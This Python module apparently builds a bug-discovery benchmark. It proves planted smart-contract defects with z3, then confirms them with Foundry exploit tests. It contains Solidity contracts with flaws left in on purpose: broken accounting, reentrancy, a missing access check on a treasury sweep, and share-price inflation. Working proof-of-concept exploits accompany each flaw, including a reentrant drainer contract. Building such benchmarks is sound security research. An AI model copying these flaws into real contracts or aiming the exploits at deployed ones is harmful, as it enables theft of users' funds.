"""
bugspec — symbolic-first bug construction for the discovery benchmark.

Instead of asking an LLM to *invent* a real bug (fragile, capability-bound, and
correlated with the finder's blind spots), we MODEL the bug symbolically and let
z3 prove it is real BEFORE any Solidity exists — the project's z3-first rule.

A BugSpec is a typed node:
    invariant      : a predicate that must always hold
    symbolic_check : a callable that uses z3 to prove correct ⇒ invariant holds
                     AND defect ⇒ invariant violable.  None = no z3 model yet
                     (forge-only: the concrete PoC is still a sound oracle, but we
                     do not claim a symbolic proof — reported honestly).
    contract       : a realistic Target.sol carrying the verified defect
    poc            : a Foundry PoC built from the witness

Pipeline per spec (see gan_symbolic.py):
    1. SYMBOLIC GATE (z3): correct holds, defect breaks  [if symbolic_check present]
    2. CONFIRM (forge): run the PoC concretely — execution, not opinion
    3. finder faces Target.sol BLIND

z3 proof status by node:
    accounting_underdebit  — z3 (conservation template)
    reentrancy_cei         — z3 (credit-limit under CEI-violating ordering)
    access_control_sweep   — z3 (effect ⇒ authorized)
    donation_inflation     — forge-only (integer-division share rounding; no clean
                             z3 model of the *fix* yet — growth axis)
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from dataclasses import dataclass
from typing import Callable, Optional

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from contract_templates import render_z3_template  # noqa: E402

GAN = os.path.join(HERE, "examples/solidity/gan")
FORGE = os.path.expanduser("~/.foundry/bin/forge")


# --------------------------------------------------------------------------- #
# spec
# --------------------------------------------------------------------------- #
@dataclass
class BugSpec:
    name: str
    bug_class: str
    invariant: str
    contract: str
    poc: str
    symbolic_check: Optional[Callable[[], dict]] = None  # None = forge-only


# --------------------------------------------------------------------------- #
# symbolic gates (z3)
# --------------------------------------------------------------------------- #
def verify_symbolic(spec: BugSpec) -> dict:
    """Prove the defect real at the model level. verified: True/False/None(forge-only)."""
    if spec.symbolic_check is None:
        return {"verified": None, "forge_only": True}
    return spec.symbolic_check()


def _sym_conservation() -> dict:
    """Accounting class via the proven conservation template (z3 over arithmetic)."""

    def run(preserves_sum: bool) -> str:
        src = render_z3_template(
            "conservation_invariant", {"preserves_sum": preserves_sum}
        )
        out = subprocess.run(
            [sys.executable, "-c", src], capture_output=True, text=True, timeout=60
        )
        return json.loads(out.stdout.strip()).get("status", "error")

    sound = run(True) == "unsat"
    breaks = run(False) == "sat"
    return {
        "verified": sound and breaks,
        "sound_baseline": sound,
        "defect_breaks": breaks,
    }


def _sym_reentrancy() -> dict:
    """CEI ordering: with the state-zeroing AFTER the external call, a reentrant
    second read sees the full credit, so the attacker extracts 2× their deposit."""
    import z3

    C = z3.Int("C")  # attacker credit (= their deposit)
    extracted_buggy = C + C  # both withdraws read credit before it is zeroed
    extracted_correct = C + 0  # zeroing precedes the second read
    s = z3.Solver()
    s.add(C > 0, extracted_buggy > C)  # invariant: extracted <= deposit
    breaks = s.check() == z3.sat
    s2 = z3.Solver()
    s2.add(C > 0, extracted_correct > C)
    sound = s2.check() == z3.unsat
    return {
        "verified": breaks and sound,
        "sound_baseline": sound,
        "defect_breaks": breaks,
    }


def _sym_access_control() -> dict:
    """A value-moving effect must imply the caller was authorized."""
    import z3

    authorized = z3.Bool("authorized")
    s = z3.Solver()
    s.add(z3.Not(authorized), z3.BoolVal(True))  # buggy: effect fires regardless
    breaks = s.check() == z3.sat
    s2 = z3.Solver()
    s2.add(z3.Not(authorized), authorized)  # correct: effect == authorized
    sound = s2.check() == z3.unsat
    return {
        "verified": breaks and sound,
        "sound_baseline": sound,
        "defect_breaks": breaks,
    }


# --------------------------------------------------------------------------- #
# forge concrete gate
# --------------------------------------------------------------------------- #
def _write(rel: str, content: str) -> None:
    path = os.path.join(GAN, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(content)


def confirm_contract(
    contract: str, poc: str, test_name: str = "Planted.t.sol"
) -> tuple[bool, str]:
    """Run a PoC against a given Target.sol source. Used both for the planted
    contract and to RE-CONFIRM that a disguised contract still carries the bug."""
    for fn in os.listdir(os.path.join(GAN, "test")):
        if fn.endswith(".sol"):
            os.remove(os.path.join(GAN, "test", fn))
    _write("src/Target.sol", contract)
    _write(f"test/{test_name}", poc)
    res = subprocess.run(
        [FORGE, "test", "--root", GAN, "--match-path", f"test/{test_name}", "-vv"],
        capture_output=True,
        text=True,
        timeout=180,
    )
    out = res.stdout + res.stderr
    return ("[PASS]" in out), out


def confirm_forge(spec: BugSpec, test_name: str = "Planted.t.sol") -> tuple[bool, str]:
    return confirm_contract(spec.contract, spec.poc, test_name)


# --------------------------------------------------------------------------- #
# catalog
# --------------------------------------------------------------------------- #
_ACCOUNTING_TARGET = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// A minimal share-tracking token. Looks ordinary; transfer() is wrong.
contract Target {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor() {
        totalSupply = 1_000_000 ether;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        // BUG: sender debited only half of what receiver is credited.
        balanceOf[msg.sender] -= amount / 2;
        balanceOf[to] += amount;
        return true;
    }
}
"""

_ACCOUNTING_POC = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Target} from "../src/Target.sol";

contract PlantedPoC is Test {
    Target t;
    address attacker = makeAddr("attacker");
    address sink = makeAddr("sink");

    function setUp() public {
        t = new Target();
        t.transfer(attacker, 1000 ether);
    }

    function test_exploit() public {
        uint256 supply = t.totalSupply();
        uint256 before = t.balanceOf(address(this)) + t.balanceOf(attacker)
            + t.balanceOf(sink);
        vm.prank(attacker);
        t.transfer(sink, 1000 ether);
        uint256 afterSum = t.balanceOf(address(this)) + t.balanceOf(attacker)
            + t.balanceOf(sink);
        assertGt(afterSum, before, "no value minted");
        assertGt(afterSum, supply, "sum still within supply");
    }
}
"""

_REENTRANCY_TARGET = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// An ETH vault. Each user can withdraw their own credit. Looks fine.
contract Target {
    mapping(address => uint256) public credit;

    function deposit() external payable {
        credit[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amt = credit[msg.sender];
        require(amt > 0, "no credit");
        // BUG: external call happens BEFORE the balance is zeroed (CEI violation).
        (bool ok, ) = msg.sender.call{value: amt}("");
        require(ok, "send failed");
        credit[msg.sender] = 0;
    }
}
"""

_REENTRANCY_POC = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Target} from "../src/Target.sol";

contract Attacker {
    Target t;
    uint256 public taken;

    constructor(Target _t) {
        t = _t;
    }

    function attack() external payable {
        t.deposit{value: msg.value}();
        t.withdraw();
    }

    receive() external payable {
        taken += msg.value;
        if (address(t).balance >= 1 ether) {
            t.withdraw();
        }
    }
}

contract PlantedPoC is Test {
    Target t;

    function setUp() public {
        t = new Target();
        // other honest users have funds in the vault
        address honest = makeAddr("honest");
        vm.deal(honest, 5 ether);
        vm.prank(honest);
        t.deposit{value: 5 ether}();
    }

    function test_exploit() public {
        Attacker a = new Attacker(t);
        vm.deal(address(this), 1 ether);
        a.attack{value: 1 ether}();
        // attacker deposited 1 ether but drained more via reentrancy
        assertGt(a.taken(), 1 ether, "no reentrant overdraw");
    }
}
"""

_ACCESS_TARGET = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// A treasury. Funds can be swept to a destination. owner is tracked but...
contract Target {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {}

    // BUG: missing access control — any caller can sweep the whole balance.
    function sweep(address payable to) external {
        to.transfer(address(this).balance);
    }
}
"""

_ACCESS_POC = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Target} from "../src/Target.sol";

contract PlantedPoC is Test {
    Target t;

    function setUp() public {
        t = new Target();
        vm.deal(address(this), 10 ether);
        t.deposit{value: 10 ether}();
    }

    function test_exploit() public {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        t.sweep(payable(attacker));
        assertEq(attacker.balance, 10 ether, "attacker did not sweep treasury");
    }
}
"""

_DONATION_TARGET = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// A share-based ETH vault. Shares = deposit * totalShares / assetsBefore.
contract Target {
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    function deposit() external payable returns (uint256 minted) {
        uint256 assetsBefore = address(this).balance - msg.value;
        if (totalShares == 0) {
            minted = msg.value;
        } else {
            // BUG: no minimum-shares / virtual-offset guard → first depositor can
            // donate to inflate assetsBefore so a later deposit rounds to 0 shares.
            minted = (msg.value * totalShares) / assetsBefore;
        }
        shares[msg.sender] += minted;
        totalShares += minted;
    }

    // lets the attacker donate raw ETH to inflate the share price
    receive() external payable {}
}
"""

_DONATION_POC = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Target} from "../src/Target.sol";

contract PlantedPoC is Test {
    Target t;

    function setUp() public {
        t = new Target();
    }

    function test_exploit() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        vm.deal(attacker, 2 ether);
        vm.deal(victim, 1 ether);

        // attacker seeds 1 share for 1 wei, then donates to inflate the price
        vm.prank(attacker);
        t.deposit{value: 1}();
        vm.prank(attacker);
        (bool ok, ) = address(t).call{value: 1 ether}("");
        require(ok, "donation failed");

        // victim deposits real money and receives ZERO shares (rounded down)
        vm.prank(victim);
        uint256 minted = t.deposit{value: 1 ether}();
        assertEq(minted, 0, "victim got shares (no rounding loss)");
    }
}
"""

CATALOG = [
    BugSpec(
        name="accounting_underdebit",
        bug_class="broken accounting / conservation",
        invariant="sum(balanceOf) == totalSupply",
        contract=_ACCOUNTING_TARGET,
        poc=_ACCOUNTING_POC,
        symbolic_check=_sym_conservation,
    ),
    BugSpec(
        name="reentrancy_cei",
        bug_class="reentrancy (CEI violation)",
        invariant="a user cannot withdraw more than they deposited",
        contract=_REENTRANCY_TARGET,
        poc=_REENTRANCY_POC,
        symbolic_check=_sym_reentrancy,
    ),
    BugSpec(
        name="access_control_sweep",
        bug_class="missing access control",
        invariant="only the owner can move treasury funds",
        contract=_ACCESS_TARGET,
        poc=_ACCESS_POC,
        symbolic_check=_sym_access_control,
    ),
    BugSpec(
        name="donation_inflation",
        bug_class="first-depositor share-price inflation",
        invariant="a non-zero deposit must mint non-zero shares",
        contract=_DONATION_TARGET,
        poc=_DONATION_POC,
        symbolic_check=None,  # forge-only for now
    ),
]


def _self_test() -> None:
    for spec in CATALOG:
        print(f"\n=== {spec.name} ({spec.bug_class}) ===")
        sym = verify_symbolic(spec)
        if sym["verified"] is None:
            print("  symbolic: (forge-only — no z3 model yet)")
        else:
            print(
                f"  symbolic: verified={sym['verified']} "
                f"(sound_baseline={sym['sound_baseline']}, defect_breaks={sym['defect_breaks']})"
            )
        ok, out = confirm_forge(spec)
        print(f"  forge:    planted bug PASS={ok}")
        if not ok:
            print("\n".join(out.strip().splitlines()[-14:]))


if __name__ == "__main__":
    _self_test()
